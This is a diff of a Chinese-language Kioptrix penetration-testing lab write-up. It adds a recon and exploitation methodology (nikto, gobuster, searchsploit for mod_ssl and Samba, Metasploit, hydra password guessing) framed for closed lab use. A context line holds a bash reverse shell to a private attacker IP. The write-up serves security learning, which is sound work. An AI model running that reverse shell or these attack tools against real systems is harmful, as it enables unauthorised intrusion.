@@ -135,3 +135,32 @@ bash -i >& /dev/tcp/192.168.199.159/4444 0>&1
 ### 额外内容
 除了samba还有mod_ssl/2.8.4的poc
 
+
+# 作者文章
+## 主机发现
+**Discovery: netdiscover or arp-scan**
+## 浏览器信息收集 
+当 `nmap` 显示 Web 端口（通常为 80 或 443）时，请使用普通浏览器打开。依次浏览：
+- 首页和 `/robots.txt` （奇怪的禁止路径）。
+- 登录表单（请注意参数名称，以便稍后使用 PentestMonkey 风格的速查表）。
+- 任何明显的版本横幅或 `Server:` / `X-Powered-By:` 标头。
+
+`nikto -h http://192.168.56.101` 通常足以告诉你是否存在明显过时的 Apache 模块、目录列表或危险的默认文件。Nikto 的设计本身就比较“嘈杂”，但在像 Kioptrix 这样的封闭实验室中，这反而是一种特性，而不是缺陷。
+
+**Gobuster 用于暴力破解目录**
+- `gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt`
+- 如果技术栈需要，则添加 `-x php,txt,bak` 。
+
+## **从服务到外壳：Searchsploit、Metasploit 和 Hydra**
+
+1. **searchsploit：您的离线漏洞利用搜索引擎**
+`searchsploit` 允许你无需打开浏览器即可在 Kali 终端中搜索 Exploit-DB：
+
+- `searchsploit mod_ssl 2.8.7`
+- `searchsploit samba 2.2.1a`
+
+2.  **Metasploit：将其作为学习工具，而非拐杖。**
+在某些 Kioptrix 层级，针对特定服务问题（例如 `mod_ssl` 漏洞）存在 Metasploit 模块。关键在于将 Metasploit 视为验证你理解程度的工具，而不是“按下按钮就能获得 shell”。
+3. **hydra：当凭证成为大门**
+`hydra` 是针对 SSH、FTP 或基本 HTTP 身份验证等服务进行受控密码猜测的首选方法——但请记住，您是在实验室环境中，而不是在生产网络中。使用从应用程序上下文中提取的小型字典，而不是大型转储文件。
+
